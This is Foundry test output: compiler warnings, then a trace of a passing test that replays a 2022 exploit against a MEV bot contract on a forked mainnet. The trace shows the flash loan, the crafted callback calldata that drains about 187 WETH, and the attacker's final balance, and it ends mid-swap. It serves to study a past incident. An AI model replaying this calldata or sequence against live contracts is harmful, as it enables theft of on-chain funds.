Compiling 23 files with Solc 0.8.28
Solc 0.8.28 finished in 1.31s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1084:5:
     |
1084 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1896:5:
     |
1896 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2198:5:
     |
2198 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2967:5:
     |
2967 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:4424:5:
     |
4424 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 23756)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [7939] ExploitScript::setUp()
    ├─ [0] VM::createSelectFork("mainnet", 1234567 [1.234e6])
    │   └─ ← [Return] 0
    └─ ← [Stop]

  [23756] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return]
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 888.06ms (3.84ms CPU time)

Ran 1 test for src/test/2022-10/MEVa47b_exp.sol:ContractTest
[PASS] testExploit() (gas: 340807)
Logs:
  
[Start] Attacker WETH balance before exploit: 0.000000000000000000
  	Attacker USDC balance during the exploit...: 241153.426286
  
[End] Attacker WETH balance after exploit: 187.558267883820309081

Traces:
  [10203] ContractTest::setUp()
    ├─ [0] VM::createSelectFork("mainnet", 15741332 [1.574e7])
    │   └─ ← [Return] 0
    ├─ [0] VM::label(WETH_TOKEN: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], "WETH_TOKEN")
    │   └─ ← [Return]
    ├─ [0] VM::label(USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], "USDC_TOKEN")
    │   └─ ← [Return]
    ├─ [0] VM::label(BALANCER_VAULT: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], "BALANCER_VAULT")
    │   └─ ← [Return]
    ├─ [0] VM::label(MEV_BOT: [0x00000000000A47b1298f18Cf67de547bbE0D723F], "MEV_BOT")
    │   └─ ← [Return]
    ├─ [0] VM::label(EXPLOIT_CONTRACT: [0x4b77c789fa35B54dAcB5F6Bb2dAAa01554299d6C], "EXPLOIT_CONTRACT")
    │   └─ ← [Return]
    ├─ [0] VM::label(WETH_USDC_PAIR_SUSHI: [0x397FF1542f962076d0BFE58eA045FfA2d347ACa0], "WETH_USDC_PAIR_SUSHI")
    │   └─ ← [Return]
    ├─ [0] VM::label(WETH_USDC_POOL_2: [0x8ad599c3A0ff1De082011EFDDc58f1908eb6e6D8], "WETH_USDC_POOL_2")
    │   └─ ← [Return]
    ├─ [0] VM::label(WETH_USDC_POOL_3: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640], "WETH_USDC_POOL_3")
    │   └─ ← [Return]
    ├─ [0] VM::label(WETH_USDC_PAIR_V2: [0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc], "WETH_USDC_PAIR_V2")
    │   └─ ← [Return]
    └─ ← [Stop]

  [419307] ContractTest::testExploit()
    ├─ [2534] WETH_TOKEN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_decimal_uint(key: "\n[Start] Attacker WETH balance before exploit", val: 0, decimals: 18)
    ├─ [279581] BALANCER_VAULT::flashLoan(MEV_BOT: [0x00000000000A47b1298f18Cf67de547bbE0D723F], [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], [1], 0x00000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000028000000000000000000000000000000000000000000000000a2d7f7bb876b5a5510000000000000000000000000000000000000000000000000000000000000003000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000c00000000000000000000000000000000000000000000000000000000000000060c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2a0b86991c6218b36c1d19d4a2e9eb0ce3606eb480000000000000000000000000000000000000000000000000000000a707868e3b4dea47088e6a0c2ddd26feeb64f039a2c41296fcb3f56400000000000000000000000000000000000000000000000000000000000000064a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000000000000000000000003d539801af7fa9385be102ac3eac297483dd6233d62b3e149626f2000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [2534] WETH_TOKEN::balanceOf(BALANCER_VAULT: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [staticcall]
    │   │   └─ ← [Return] 160620508572947813346540 [1.606e23]
    │   ├─ [2350] 0xce88686553686DA562CE7Cea497CE749DA109f9F::getFlashLoanFeePercentage() [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [10862] WETH_TOKEN::transfer(MEV_BOT: [0x00000000000A47b1298f18Cf67de547bbE0D723F], 1)
    │   │   ├─ emit Transfer(from: BALANCER_VAULT: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], to: MEV_BOT: [0x00000000000A47b1298f18Cf67de547bbE0D723F], value: 1)
    │   │   ├─  storage changes:
    │   │   │   @ 0x3a0f132b80eb284c2ac247698d2ec7dce851ca420b700161ad6082d0e9762150: 0x0000000000000000000000000000000000000000000022034155e72b52f9acec → 0x0000000000000000000000000000000000000000000022034155e72b52f9aceb
    │   │   │   @ 0x96dc16738d1a7c03d43d72b54a098647722affe4be235279e75d32a0c49487fc: 0x00000000000000000000000000000000000000000000000a2d7f7bb876b5a551 → 0x00000000000000000000000000000000000000000000000a2d7f7bb876b5a552
    │   │   └─ ← [Return] true
    │   ├─ [241115] MEV_BOT::receiveFlashLoan([0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], [1], [0], 0x00000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000028000000000000000000000000000000000000000000000000a2d7f7bb876b5a5510000000000000000000000000000000000000000000000000000000000000003000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000c00000000000000000000000000000000000000000000000000000000000000060c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2a0b86991c6218b36c1d19d4a2e9eb0ce3606eb480000000000000000000000000000000000000000000000000000000a707868e3b4dea47088e6a0c2ddd26feeb64f039a2c41296fcb3f56400000000000000000000000000000000000000000000000000000000000000064a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000000000000000000000003d539801af7fa9385be102ac3eac297483dd6233d62b3e149626f2000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000)
    │   │   ├─ [238044] 0x770200a211315a0688C289F437317Ea117cB4D23::receiveFlashLoan([0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], [1], [0], 0x00000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000028000000000000000000000000000000000000000000000000a2d7f7bb876b5a5510000000000000000000000000000000000000000000000000000000000000003000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000c00000000000000000000000000000000000000000000000000000000000000060c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2a0b86991c6218b36c1d19d4a2e9eb0ce3606eb480000000000000000000000000000000000000000000000000000000a707868e3b4dea47088e6a0c2ddd26feeb64f039a2c41296fcb3f56400000000000000000000000000000000000000000000000000000000000000064a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000000000000000000000003d539801af7fa9385be102ac3eac297483dd6233d62b3e149626f2000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
    │   │   │   ├─ [838] 0x2D0037e6E417baeF5adc0D521DD127E724279BfE::getMetadata(0x88e6a0c2ddd26feeb64f039a2c41296fcb3f5640)
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000002d0037e6e417baef5adc0d521dd127e724279bfe
    │   │   │   ├─ [1352] 0xfBc83fA919e6c83d9d9CcC1171df44D624Da4c25::getMetadata(0x7fa9385be102ac3eac297483dd6233d62b3e149626f20000)
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   ├─ [25162] WETH_TOKEN::transfer(0x2D0037e6E417baeF5adc0D521DD127E724279BfE, 187745915823040341329 [1.877e20])
    │   │   │   │   ├─ emit Transfer(from: MEV_BOT: [0x00000000000A47b1298f18Cf67de547bbE0D723F], to: 0x2D0037e6E417baeF5adc0D521DD127E724279BfE, value: 187745915823040341329 [1.877e20])
    │   │   │   │   ├─  storage changes:
    │   │   │   │   │   @ 0x96dc16738d1a7c03d43d72b54a098647722affe4be235279e75d32a0c49487fc: 0x00000000000000000000000000000000000000000000000a2d7f7bb876b5a552 → 1
    │   │   │   │   │   @ 0x05f654c32c8083d21b813a7bbc5af3bc5436f864b2c9eac807968bb93988b5fc: 0 → 0x00000000000000000000000000000000000000000000000a2d7f7bb876b5a551
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [158159] 0x2D0037e6E417baeF5adc0D521DD127E724279BfE::execute(0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2a0b86991c6218b36c1d19d4a2e9eb0ce3606eb487fa9385be102ac3eac297483dd6233d62b3e1496000000000000000a2d7f7bb876b5a55188e6a0c2ddd26feeb64f039a2c41296fcb3f5640)
    │   │   │   │   ├─ [129360] WETH_USDC_POOL_3::swap(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], false, 187745915823040341329 [1.877e20], 1461446703485210103287273052203988822378723970341 [1.461e48], 0x000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2)
    │   │   │   │   │   ├─ [44017] USDC_TOKEN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 241153426286 [2.411e11])
    │   │   │   │   │   │   ├─ [36728] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 241153426286 [2.411e11]) [delegatecall]
    │   │   │   │   │   │   │   ├─ emit Transfer(from: WETH_USDC_POOL_3: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 241153426286 [2.411e11])
    │   │   │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   │   │   @ 0x1f21a62c4538bacf2aabeca410f0fe63151869f172e03c0e00357ba26a341eff: 0x0000000000000000000000000000000000000000000000000000251bbad24a61 → 0x000000000000000000000000000000000000000000000000000024e394f506f3
    │   │   │   │   │   │   │   │   @ 0xea80dd88ed2c8da1b3cfa53b6b2568ae58fe83d484d0c01324a62ba1aa9ffdac: 0 → 0x0000000000000000000000000000000000000000000000000000003825dd436e
    │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [2534] WETH_TOKEN::balanceOf(WETH_USDC_POOL_3: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640]) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 82903723533842235608840 [8.29e22]
    │   │   │   │   │   ├─ [9664] 0x2D0037e6E417baeF5adc0D521DD127E724279BfE::uniswapV3SwapCallback(-241153426286 [-2.411e11], 187745915823040341329 [1.877e20], 0x000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2)
    │   │   │   │   │   │   ├─ [6062] WETH_TOKEN::transfer(WETH_USDC_POOL_3: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640], 187745915823040341329 [1.877e20])
    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x2D0037e6E417baeF5adc0D521DD127E724279BfE, to: WETH_USDC_POOL_3: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640], value: 187745915823040341329 [1.877e20])
    │   │   │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   │   │   @ 0x05f654c32c8083d21b813a7bbc5af3bc5436f864b2c9eac807968bb93988b5fc: 0x00000000000000000000000000000000000000000000000a2d7f7bb876b5a551 → 0
    │   │   │   │   │   │   │   │   @ 0x390f6178407c9b8e95802b8659e6df8e34c1e3d4f8d6a49e6132bbcdd937b63a: 0x00000000000000000000000000000000000000000000118e38489f46f2694f08 → 0x00000000000000000000000000000000000000000000119865c81aff691ef459
    │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   ├─ [534] WETH_TOKEN::balanceOf(WETH_USDC_POOL_3: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640]) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 83091469449665275950169 [8.309e22]
    │   │   │   │   │   ├─ emit Swap(param0: 0x2D0037e6E417baeF5adc0D521DD127E724279BfE, param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: -241153426286 [-2.411e11], param3: 187745915823040341329 [1.877e20], param4: 2210689469138442312851952928729968 [2.21e33], param5: 12355298757346402867 [1.235e19], param6: 204739 [2.047e5])
    │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   @ 4: 0x000000000000000000000000000000000000000000000000ab8919c24f83f0ac → 0x000000000000000000000000000000000000000000000000ab76d6c235752233
    │   │   │   │   │   │   @ 0x565b31aa18585d4f0af8b2eba260b94a84362c089c23f5940d7dd0c3473fd53a: 0x000000000000000000000000000000000000008c08b02e3d0806cf58a62f2778 → 0x00000000000000000000000000000000000063aaa6fb917b1f8be297e7c1687f
    │   │   │   │   │   │   @ 0x565b31aa18585d4f0af8b2eba260b94a84362c089c23f5940d7dd0c3473fd53c: 0x0100038d5400000000000000000006ae85e22dc6685d72a01200000b1a3d29d4 → 0x016344dc170000000000000001e9320d6dc2de72e34152d3700008248c05d877
    │   │   │   │   │   │   @ 2: 0x00000000000000000000000000000a73ee57112b736a55eaa03e4ba412dd9fb7 → 0x00000000000000000000000000000a73f048fa1b19eaeb53fae84d3c7986e440
    │   │   │   │   │   │   @ 0: 0x00010002d002d00239031fb90000000000006cefa2f357c32270697440c67a13 → 0x00010002d002d0023a031fc30000000000006cfed2ed3f18487f0b8b7382ab70
    │   │   │   │   │   │   @ 0x565b31aa18585d4f0af8b2eba260b94a84362c089c23f5940d7dd0c3473fd53b: 0x0000000000000000000000000000001a0d8eb041af45824c950836d7e0205bfc → 0x00000000000000000000000000000a59e0f59d0c866e993076e57fbbcf1b07a9
    │   │   │   │   │   │   @ 578: 0x010000000000000001e938450f7040004ff0f8695200082ec2cb7003634820ab → 0x010000000000000001e938bbf3a50c394b9ec5738200082fa643024b6348696b
    │   │   │   │   │   └─ ← [Return] -241153426286 [-2.411e11], 187745915823040341329 [1.877e20]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000003825dd436e
    │   │   │   ├─ [13101] 0xfBc83fA919e6c83d9d9CcC1171df44D624Da4c25::execute(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48c02aaa39b223fe8d0a0e5c4f27ead9083c756cc200000000000a47b1298f18cf67de547bbe0d723f00000000000000000000003825dd436e7fa9385be102ac3eac297483dd6233d62b3e149626f20000) [delegatecall]
    │   │   │   │   ├─ [6478] ContractTest::getReserves() [staticcall]
    │   │   │   │   │   ├─ [2517] WETH_USDC_PAIR_SUSHI::getReserves() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 20359275168577 [2.035e13], 15808279772427860813156 [1.58e22], 1665689507 [1.665e9]
    │   │   │   │   │   └─ ← [Return] 20359275168577 [2.035e13], 15808279772427860813156 [1.58e22], 1665689507 [1.665e9]
    │   │   │   │   ├─ [1050] ContractTest::swap(0, 184506726843153410278 [1.845e20], MEV_BOT: [0x00000000000A47b1298f18Cf67de547bbE0D723F], 0x)
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000a008b92815c3068e6
    │   │   │   ├─ [534] WETH_TOKEN::balanceOf(MEV_BOT: [0x00000000000A47b1298f18Cf67de547bbE0D723F]) [staticcall]
    │   │   │   │   └─ ← [Return] 1
    │   │   │   ├─ [3262] WETH_TOKEN::transfer(BALANCER_VAULT: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], 1)
    │   │   │   │   ├─ emit Transfer(from: MEV_BOT: [0x00000000000A47b1298f18Cf67de547bbE0D723F], to: BALANCER_VAULT: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], value: 1)
    │   │   │   │   ├─  storage changes:
    │   │   │   │   │   @ 0x3a0f132b80eb284c2ac247698d2ec7dce851ca420b700161ad6082d0e9762150: 0x0000000000000000000000000000000000000000000022034155e72b52f9aceb → 0x0000000000000000000000000000000000000000000022034155e72b52f9acec
    │   │   │   │   │   @ 0x96dc16738d1a7c03d43d72b54a098647722affe4be235279e75d32a0c49487fc: 1 → 0
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─  storage changes:
    │   │   │   │   @ 0: 0x00000000000000000000000088e6a0c2ddd26feeb64f039a2c41296fcb3f5640 → 0
    │   │   │   │   @ 0x05f654c32c8083d21b813a7bbc5af3bc5436f864b2c9eac807968bb93988b5fc: 0 → 0x00000000000000000000000000000000000000000000000a2d7f7bb876b5a551
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   ├─ [534] WETH_TOKEN::balanceOf(BALANCER_VAULT: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [staticcall]
    │   │   └─ ← [Return] 160620508572947813346540 [1.606e23]
    │   ├─ emit FlashLoan(param0: MEV_BOT: [0x00000000000A47b1298f18Cf67de547bbE0D723F], param1: WETH_TOKEN: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], param2: 1, param3: 0)
    │   └─ ← [Stop]
    ├─ [1315] USDC_TOKEN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 241153426286 [2.411e11]
    │   └─ ← [Return] 241153426286 [2.411e11]
    ├─ emit log_named_decimal_uint(key: "\tAttacker USDC balance during the exploit...", val: 241153426286 [2.411e11], decimals: 6)
    ├─ [27867] USDC_TOKEN::approve(0xE592427A0AEce92De3Edee1F18E0157C05861564, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ [27078] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::approve(0xE592427A0AEce92De3Edee1F18E0157C05861564, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xE592427A0AEce92De3Edee1F18E0157C05861564, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   ├─  storage changes:
    │   │   │   @ 0xc81d9832a58ca5596ef91aeee7b9876071d1b466739bb153bc12d9794dc6ec7e: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    │   │   └─ ← [Return] true
    │   └─ ← [Return] true
    ├─ [1315] USDC_TOKEN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 241153426286 [2.411e11]
    │   └─ ← [Return] 241153426286 [2.411e11]
    ├─ [72364] 0xE592427A0AEce92De3Edee1F18E0157C05861564::exactInputSingle(ExactInputSingleParams({ tokenIn: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, tokenOut: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, fee: 500, recipient: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, deadline: 1665689963 [1.665e9], amountIn: 241153426286 [2.411e11], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }))
    │   ├─ [67432] WETH_USDC_POOL_3::swap(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true, 241153426286 [2.411e11], 4295128740 [4.295e9], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002ba0b86991c6218b36c1d19d4a2e9eb0ce3606eb480001f4c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000)
    │   │   ├─ [23162] WETH_TOKEN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 187558267883820309081 [1.875e20])
    │   │   │   ├─ emit Transfer(from: WETH_USDC_POOL_3: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 187558267883820309081 [1.875e20])
    │   │   │   ├─  storage changes:
    │   │   │   │   @ 0x390f6178407c9b8e95802b8659e6df8e34c1e3d4f8d6a49e6132bbcdd937b63a: 0x00000000000000000000000000000000000000000000119865c81aff691ef459 → 0x00000000000000000000000000000000000000000000118e3ae348156a749a00
    │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x00000000000000000000000000000000000000000000000a2ae4d2e9feaa5a59
    │   │   │   └─ ← [Return] true
    │   │   ├─ [1315] USDC_TOKEN::balanceOf(WETH_USDC_POOL_3: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640]) [staticcall]
    │   │   │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(WETH_USDC_POOL_3: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640]) [delegatecall]
    │   │   │   │   └─ ← [Return] 40559875262195 [4.055e13]
    │   │   │   └─ ← [Return] 40559875262195 [4.055e13]
    │   │   ├─ [10048] 0xE592427A0AEce92De3Edee1F18E0157C05861564::uniswapV3SwapCallback(241153426286 [2.411e11], -187558267883820309081 [-1.875e20], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002ba0b86991c6218b36c1d19d4a2e9eb0ce3606eb480001f4c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000)
    │   │   │   ├─ [5992] USDC_TOKEN::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], WETH_USDC_POOL_3: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640], 241153426286 [2.411e11])
    │   │   │   │   ├─ [5197] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], WETH_USDC_POOL_3: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640], 241153426286 [2.411e11]) [delegatecall]
    │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: WETH_USDC_POOL_3: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640], value: 241153426286 [2.411e11])
    │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   @ 0xea80dd88ed2c8da1b3cfa53b6b2568ae58fe83d484d0c01324a62ba1aa9ffdac: 0x0000000000000000000000000000000000000000000000000000003825dd436e → 0
    │   │   │   │   │   │   @ 0x1f21a62c4538bacf2aabeca410f0fe63151869f172e03c0e00357ba26a341eff: 0x000000000000000000000000000000000000000000000000000024e394f506f3 → 0x0000000000000000000000000000000000000000000000000000251bbad24a61
    │   │   │   │   │   │   @ 0xc81d9832a58ca5596ef91aeee7b9876071d1b466739bb153bc12d9794dc6ec7e: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffc7da22bc91
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop]
    │   │   ├─ [1315] USDC_TOKEN::balanceOf(WETH_USDC_POOL_3: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640]) [staticcall]
    │   │   │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(WETH_USDC_POOL_3: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640]) [delegatecall]
    │   │   │   │   └─ ← [Return] 40801028688481 [4.08e13]
    │   │   │   └─ ← [Return] 40801028688481 [4.08e13]
    │   │   ├─ emit Swap(param0: 0xE592427A0AEce92De3Edee1F18E0157C05861564, param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 241153426286 [2.411e11], param3: -187558267883820309081 [-1.875e20], param4: 2209486799870850430045561811856381 [2.209e33], param5: 12360438974643433644 [1.236e19], param6: 204729 [2.047e5])
    │   │   ├─  storage changes:
    │   │   │   @ 4: 0x000000000000000000000000000000000000000000000000ab76d6c235752233 → 0x000000000000000000000000000000000000000000000000ab8919c24f83f0ac
    │   │   │   @ 1: 0x0000000000000000000000000000000000006436afabbfb82792b1f08df08ff7 → 0x0000000000000000000000000000000000006436ba669736f06029d2093452c1
    │   │   │   @ 0x565b31aa18585d4f0af8b2eba260b94a84362c089c23f5940d7dd0c3473fd53c: 0x016344dc170000000000000001e9320d6dc2de72e34152d3700008248c05d877 → 0x0100038d5400000000000000000006ae85e22dc6685d72a01200000b1a3d29d4
    │   │   │   @ 0: 0x00010002d002d0023a031fc30000000000006cfed2ed3f18487f0b8b7382ab70 → 0x00010002d002d0023a031fb90000000000006cefa4e48b850cb902b981cf6bfd
    │   │   │   @ 0x565b31aa18585d4f0af8b2eba260b94a84362c089c23f5940d7dd0c3473fd53a: 0x00000000000000000000000000000000000063aaa6fb917b1f8be297e7c1687f → 0x000000000000000000000000000000000000008c127299204c2d9171d4636c4c
